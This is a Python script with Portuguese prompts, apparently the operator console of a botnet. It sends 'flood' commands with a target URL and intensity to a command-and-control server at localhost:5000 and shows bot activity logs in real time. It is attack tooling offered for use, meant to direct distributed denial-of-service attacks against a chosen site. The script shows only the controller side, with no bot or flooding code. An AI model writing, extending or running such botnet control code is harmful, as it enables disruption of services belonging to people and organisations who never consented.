import requests
import time
import os

C2_URL = "http://localhost:5000"

def menu():
    print("\n" + "="*30)
    print("   BOTNET CONTROL PANEL")
    print("="*30)
    print("1. Iniciar Ataque DDoS")
    print("2. Monitorar Logs (Real-time)")
    print("3. Sair")
    return input("Escolha uma opção: ")

def attack_ddos():
    print("\n--- CONFIGURAÇÃO DE ATAQUE ---")
    target = input("URL do alvo (ex: http://target-server): ")
    try:
        intensity = int(input("Intensidade (requisições por lote): "))
    except ValueError:
        print("[!] Intensidade deve ser um número.")
        return

    payload = {
        "action": "flood",
        "target_url": target,
        "intensity": intensity
    }
    
    try:
        print("[*] Enviando comando para o C2...")
        resp = requests.post(f"{C2_URL}/admin/send_command", json=payload)
        if resp.status_code == 200:
            print(f"[+] Sucesso! {resp.json().get('status')}")
        else:
            print(f"[!] Erro do servidor: {resp.status_code}")
    except Exception as e:
        print(f"[-] Erro de conexão: {e}")

def monitor_logs():
    print("\n[*] Conectando ao stream de logs... (Ctrl+C para parar)")
    try:
        while True:
            resp = requests.get(f"{C2_URL}/admin/get_logs")
            logs = resp.json()
            
            if not logs:
                print("[!] Sem logs no momento...")
            else:
                # Limpa a tela para simular um terminal de monitoramento
                os.system('cls' if os.name == 'nt' else 'clear')
                print("\n=== MONITORAMENTO DE ATIVIDADE DA BOTNET ===")
                print(f"Total de eventos: {len(logs)}")
                print("-" * 45)
                
                # Mostra os últimos 15 logs
                for log in logs[-15:]:
                    ts = log.get('timestamp', '??:??:??')
                    bot = log.get('bot_id', '??')
                    msg = log.get('message', '...')
                    print(f"[{ts}] [{bot}] {msg}")
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Monitoramento encerrado.")
    except Exception as e:
        print(f"[!] Erro no monitoramento: {e}")

def main():
    while True:
        choice = menu()
        if choice == '1':
            attack_ddos()
        elif choice == '2':
            monitor_logs()
        elif choice == '3':
            print("[*] Encerrando...")
            break
        else:
            print("[!] Opção inválida.")

if __name__ == "__main__":
    main()